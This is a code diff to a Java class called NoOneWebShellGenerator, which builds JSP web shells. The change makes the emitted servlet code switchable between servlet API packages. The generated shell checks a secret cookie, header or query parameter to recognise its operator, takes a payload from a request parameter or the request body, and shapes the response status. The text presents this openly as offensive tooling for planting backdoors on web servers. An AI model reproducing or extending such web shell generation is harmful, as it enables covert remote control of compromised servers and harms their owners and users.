@@ -31,9 +31,15 @@ public class NoOneWebShellGenerator {
     private static final String JSPX_TEMPLATE_PATH = "/templates/java/vul-java-server.jspx";
 
     private final NoOneConfig config;
+    private final ServletModule servletModule;
 
     public NoOneWebShellGenerator(NoOneConfig config) {
+        this(config, ServletModule.JAVAX);
+    }
+
+    public NoOneWebShellGenerator(NoOneConfig config, ServletModule servletModule) {
         this.config = Objects.requireNonNull(config, "config");
+        this.servletModule = Objects.requireNonNull(servletModule, "servletModule");
     }
 
     public String generateJsp() {
@@ -170,7 +176,7 @@ public class NoOneWebShellGenerator {
         sb.append("    private boolean isAuthed(Object request) {\n");
 
         if (location == IdentifierLocation.COOKIE) {
-            sb.append("        javax.servlet.http.Cookie[] cookies = ((javax.servlet.http.HttpServletRequest) request).getCookies();\n");
+            sb.append("        ").append(servletModule.cookie()).append("[] cookies = ((").append(servletModule.httpServletRequest()).append(") request).getCookies();\n");
             sb.append("        if (cookies != null) {\n");
             sb.append("            for (int i = 0; i < cookies.length; i++) {\n");
             sb.append("                if (\"").append(name).append("\".equals(cookies[i].getName())) {\n");
@@ -182,7 +188,7 @@ public class NoOneWebShellGenerator {
             sb.append("        return false;\n");
         } else {
             String getter = (location == IdentifierLocation.QUERY_PARAM) ? "getParameter" : "getHeader";
-            sb.append("        String v = ((javax.servlet.http.HttpServletRequest) request).")
+            sb.append("        String v = ((").append(servletModule.httpServletRequest()).append(") request).")
                     .append(getter).append("(\"").append(name).append("\");\n");
             sb.append("        return ").append(operatorExpr("v", operator, value)).append(";\n");
         }
@@ -221,7 +227,7 @@ public class NoOneWebShellGenerator {
             if (paramName == null) {
                 paramName = "q";
             }
-            sb.append("            String value = ((javax.servlet.http.HttpServletRequest) request).getParameter(\"")
+            sb.append("            String value = ((").append(servletModule.httpServletRequest()).append(") request).getParameter(\"")
                     .append(escapeJava(paramName)).append("\");\n");
             if (prefix == 0 && suffix == 0) {
                 sb.append("            return value.getBytes(\"UTF-8\");\n");
@@ -230,7 +236,7 @@ public class NoOneWebShellGenerator {
                         .append(", value.length() - ").append(suffix).append(").getBytes(\"UTF-8\");\n");
             }
         } else {
-            sb.append("            java.io.InputStream in = ((javax.servlet.http.HttpServletRequest) request).getInputStream();\n");
+            sb.append("            java.io.InputStream in = ((").append(servletModule.httpServletRequest()).append(") request).getInputStream();\n");
             sb.append("            ByteArrayOutputStream bos = new ByteArrayOutputStream();\n");
             sb.append("            byte[] buf = new byte[4096];\n");
             sb.append("            int len;\n");
@@ -425,7 +431,7 @@ public class NoOneWebShellGenerator {
 
         StringBuilder sb = new StringBuilder();
         sb.append("    private void wrapResponse(Object response) {\n");
-        sb.append("        javax.servlet.http.HttpServletResponse res = (javax.servlet.http.HttpServletResponse) response;\n");
+        sb.append("        ").append(servletModule.httpServletResponse()).append(" res = (").append(servletModule.httpServletResponse()).append(") response;\n");
 
         if (statusCode > 0) {
             sb.append("        res.setStatus(").append(statusCode).append(");\n");
